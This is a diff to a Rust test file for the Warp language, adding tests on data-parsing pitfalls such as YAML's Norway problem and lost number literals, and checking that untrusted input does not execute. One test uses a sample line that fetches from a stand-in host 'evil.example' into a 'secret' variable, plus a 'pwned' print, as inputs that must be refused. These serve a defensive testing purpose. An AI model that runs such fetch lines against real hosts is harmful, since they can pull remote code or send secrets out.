@@ -1,8 +1,8 @@
 //! Footguns of other languages, checked against Warp (see footguns.md).
 //! Passing tests back the "Solved" section; `#[ignore = "next"]` tests are the "NOT YET" section's clear-cut fixes.
 
-use warp::wasm_emitter::eval;
-use warp::{is, Node};
+use warp::wasm_emitter::{eval, eval_untrusted};
+use warp::{is, parse_data, Node};
 
 fn fails_with(code: &str, needle: &str) {
 	match eval(code) {
@@ -77,6 +77,34 @@ fn test_law_catches_a_false_property() {
 #[test]
 fn test_hidden_side_effect_is_rejected() {
 	fails_with("log(x) := puts x\nsquare(x) := log(x) ! Pure\nsquare(3)", "square → log → puts");
+}
+
+#[test]
+fn test_norway_problem_in_data() {
+	assert_eq!(parse_data("country: NO").serialize(), "country:NO"); // YAML 1.1: false
+	assert_eq!(parse_data("answer: yes").serialize(), "answer:yes"); // YAML 1.1: true
+	assert_eq!(parse_data("[de gb no]").serialize(), "[de gb no]");
+	assert_eq!(parse_data("flag: true").serialize(), "flag:true");
+	assert_eq!(parse_data("missing: null")["missing"], Node::Empty);
+}
+
+#[test]
+fn test_data_keeps_number_literals() {
+	assert_eq!(parse_data("version: 1.10").serialize(), "version:1.10"); // YAML: 1.1
+	assert_eq!(parse_data("zip: 01234").serialize(), "zip:01234"); // CSV importers: 1234
+	assert_eq!(parse_data("zip: 01234")["zip"].drop_meta(), &Node::int(1234)); // still a number
+	assert_eq!(parse_data("n: 12").serialize(), "n:12");
+	assert_eq!(parse_data("mask: 0xFF").serialize(), "mask:0xFF");
+	assert_eq!(parse_data("big: 1_000").serialize(), "big:1_000");
+}
+
+#[test]
+fn test_data_does_not_execute() {
+	let loaded = parse_data("secret = fetch https://evil.example/x\nsecret");
+	assert!(loaded.serialize().contains("fetch"), "{}", loaded.serialize());
+	assert!(matches!(eval_untrusted("puts('pwned')"), Node::Error(_)));
+	assert!(matches!(eval_untrusted("use m;floor(4.5)"), Node::Error(_)));
+	assert_eq!(eval_untrusted("x:=3;x*x"), Node::int(9));
 }
 
 #[test]
